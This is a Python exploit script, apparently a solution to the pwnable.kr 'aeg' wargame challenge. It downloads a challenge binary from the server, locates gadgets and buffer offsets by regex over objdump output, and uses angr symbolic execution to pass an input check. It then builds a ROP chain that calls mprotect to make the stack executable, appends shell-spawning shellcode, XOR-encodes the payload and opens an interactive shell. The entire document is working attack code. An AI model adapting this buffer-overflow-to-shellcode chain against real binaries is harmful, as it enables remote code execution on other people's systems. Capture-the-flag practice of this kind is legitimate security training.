# pwnable.kr aeg
from pwn import *
import claripy
import angr

context.arch = 'amd64'
bin_info = {}
hex_regex = r'[\dabcdef]*'
hex_regex_match = '(' + hex_regex + ')'


def get_binary(path: str = 'chal'):
    r = remote('pwnable.kr', 9005)
    r.recvuntil(b'wait...\n')
    b64 = r.recvline().strip().decode()
    raw_data = base64.b64decode(b64)
    gzfile = open(path + '.gz', 'wb')
    gzfile.write(raw_data)
    os.system(f'gzip -d {path}.gz')
    return r, path


def binary_parse(path: str) -> None:
    objdump = subprocess.check_output(f'objdump -d -M intel {path}', shell=True)
    objdump = objdump.decode()

    start_regex = hex_regex + ':.*<puts@plt>\n ' + hex_regex_match + ':'
    start = re.findall(pattern=start_regex, string=objdump)
    start = int(start[2], 16)
    bin_info['start'] = start

    target_regex = hex_regex_match + ':.*call.*<memcpy@plt>'
    target = re.findall(pattern=target_regex, string=objdump)
    target = int(target[0], 16)
    bin_info['target'] = target

    buffer_addr_regex = 'rdx,\[rax\+0x' + hex_regex_match
    buffer_addr = re.findall(pattern=buffer_addr_regex, string=objdump)
    buffer_addr = int(buffer_addr[0], 16)
    bin_info['buffer_addr'] = buffer_addr

    padding_regex = 'sub.*rsp,0x' + hex_regex_match
    padding = re.findall(pattern=padding_regex, string=objdump)
    padding = int(padding[0], 16)
    bin_info['padding'] = padding

    xor_regex = 'xor.*eax,0x' + hex_regex_match
    xors = re.findall(pattern=xor_regex, string=objdump)
    xor0 = int(xors[0], 16) & 0xFF
    xor1 = int(xors[1], 16) & 0xFF
    bin_info['xors'] = int.to_bytes(xor0) + int.to_bytes(xor1)

    rdx_gadget_regex = hex_regex_match + ':.*mov\s*rdx,QW.*\[rbp-0x' + hex_regex_match
    rdx_gadget = re.findall(pattern=rdx_gadget_regex, string=objdump)
    rdx_gadget_addr = int(rdx_gadget[0][0], 16)
    rdx_gadget_offset = int(rdx_gadget[0][1], 16)
    bin_info['rdx_gadget_addr'] = rdx_gadget_addr
    bin_info['rdx_gadget_offset'] = rdx_gadget_offset


def angr_solver(path: str) -> bytes:
    proj = angr.Project(path)
    init = proj.factory.blank_state(
        addr=bin_info['start'],
        add_options={
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
        },
    )
    buffer = claripy.BVS('buffer', 48 * 8)
    init.memory.store(bin_info['buffer_addr'], buffer)
    simu = proj.factory.simgr(init)
    simu.use_technique(angr.exploration_techniques.DFS())
    simu.explore(find=bin_info['target'])
    if simu.found:
        solution = simu.found[0]
        payload = solution.solver.eval(buffer, cast_to=bytes)
    return payload


def exp_craft(path: str, padding: bytes) -> str:
    exe = ELF(path)

    payload = b''
    payload += padding
    payload += cyclic(bin_info['padding'])
    payload += p64(
        bin_info['buffer_addr']
        + 80
        + bin_info['rdx_gadget_offset']
        + bin_info['padding']
    )
    payload += p64(bin_info['rdx_gadget_addr'])
    payload += p64(0)
    payload += p64(0x10000)
    # len -> rsi: 0x10000
    payload += p64(7)
    # prot -> rdx: PROT_READ | PROT_WRITE | PROT_EXEC
    payload += p64(bin_info['buffer_addr'] & 0xFFFFFFFFFFFFF000)
    # addr -> rdi: buffer address
    payload += cyclic(bin_info['rdx_gadget_offset'] - 8)
    payload += p64(exe.plt['mprotect'])
    payload += p64(
        bin_info['buffer_addr']
        + 104
        + bin_info['rdx_gadget_offset']
        + bin_info['padding']
    )
    payload += asm(shellcraft.sh())

    payload = xor(bin_info['xors'], payload)
    return payload.hex()


def aeg_pwn(pathname: str = 'chal'):
    io, path = get_binary(pathname)
    binary_parse(path)
    padding = angr_solver(path)
    payload = exp_craft(path, padding)
    io.sendline(payload)
    io.interactive()


if __name__ == '__main__':
    aeg_pwn('pwn')
